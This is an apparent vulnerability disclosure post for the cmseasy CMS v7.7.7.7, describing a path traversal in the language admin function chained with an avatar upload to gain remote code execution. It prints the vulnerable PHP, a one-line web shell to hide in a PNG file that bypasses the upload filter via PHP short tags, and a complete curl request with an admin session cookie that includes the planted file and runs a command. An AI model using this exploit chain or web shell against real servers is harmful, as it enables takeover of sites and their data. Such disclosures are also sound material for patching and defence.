---
title: cmseasy v7.7.7.7 (20230520) Path Traversal
date: 2023-06-06 14:26:52
tags:
---

## Product

cmseasy v7.7.7.7 20230520

## Official Site

https://www.cmseasy.cn/

## Exploit

In `lib/admin/language_admin.php`, the method `add_action`:

```php
function add_action() {
    $lang_choice='system.php';
    if (isset($_GET['lang_choice'])){
        $lang_choice=$_GET['lang_choice'];
    }
    if (front::post('submit')) {
        $langid=front::get('id');
        $lang=new lang();
        $langdata = $lang->getrows('id='.$langid, 1);
        if (is_array($langdata)){
            $langurlname=$langdata[0]['langurlname'];
        }else{
            front::alert(lang_admin('language_pack').lang_admin('nonentity'));
        }

        $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice;
        if(file_exists($path)){
            $str= file_get_contents($path);//将整个文件内容读入到一个字符串中
            if(inject_check($str)){
                exit(lang_admin('文件异常'));
            }
        }

        $lang_data = include $path;
        if (is_array($lang_data)){
            $lang_data[front::$post['key']]=front::$post['val'];
            file_put_contents(($path), '<?php return ' . var_export($lang_data, true) . ';');
        }
        
        // ...
    }
    $this->view->lang_choice=$lang_choice;
}
```

The variabel `$path` is controlable by passing query parameter `language_choice` and there is no filter for `../`, which leads to arbitrary local file inclusion.

One can upload a malicious png file via the avatar upload api `uploadimage3`

```plain
http://localhost:5000/index.php?case=tool&act=uploadimage3
```

```php
function uploadimage3_action()
{
    $res = array();
    $uploads = array();
    if (is_array($_FILES)) {
        $upload = new upload();
        $upload->dir = 'images';
        $upload->max_size = config::get('upload_max_filesize') * 1024 * 1024;
        $_file_type = str_replace(',', '|', config::get('upload_filetype'));
        foreach ($_FILES as $name => $file) {
            $res[$name]['size'] = ceil($file['size'] / 1024);
            if ($file['size'] > $upload->max_size) {
                $res[$name]['code'] = "1";
                $res[$name]['msg'] = lang('attachment_exceeding_the_upper_limit') . "(" . ceil($upload->max_size / 1024) . "K)！";
                break;
            }
            if (!front::checkstr(file_get_contents($file['tmp_name']))) {
                $res[$name]['code'] = "2";
                $res[$name]['msg'] = lang('upload_failed_attachment_is_not_verified');
                break;
            }
            if (!$file['name'] || !preg_match('/\.(' . $_file_type . ')$/', $file['name']))
                continue;
            $uploads[$name] = $upload->run($file);
            if (!$uploads[$name]) {
                $res[$name]['code'] = "3";
                $res[$name]['msg'] = lang('attachment_save_failed');
                break;
            }
            $str = (config::get('base_url')==""?"":config::get('base_url')) .$uploads[$name];
            $res[$name]['name'] = $str;
            $res[$name]['type'] = $file['type'];
            $res[$name]['code'] = "0";


            //图片上传  插件
            apps::updateimg($uploads[$name],ROOT.$str);

        }
    }
    echo json::encode($res);
}
```

Although this method uses `front::checkstr` to check malformed contents, there is a missing of php short tags.

```php
static function checkstr($str)
{
    if (preg_match("/<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>/is", $str, $match)) {
        //front::flash(print_r($match,true));
        return false;
    }
    if (preg_match("/(<[^>]*)on[a-zA-Z]+\s*=([^>]*>)/is", $str, $match)) {
        return false;
    }
    return true;
}
```

Hackers can construct a png file with following contents and obtain the storing path after uploading it.

```php
<?= system($_GET['a']); ?>
```

Just invoke the language adding api and include the malicious image to RCE:

```bash
curl 'http://localhost:5000/index.php?case=language&act=add&admin_dir=admin&id=1&lang_choice=../../cn/upload/images/202306/16856887744033.png&a=whoami' \
  -H 'Cookie: PHPSESSID=mdr3p80arphh454bsffqi2o71g; login_username=admin; login_password=oXtK-mknJjNu%253DaxvRZtfrah7PXdq7bkw9XdbwZ0nPXAaJ2ab18391e6e61e99aff8e10d05e4ad02' \
  -d 'submit=1'
```

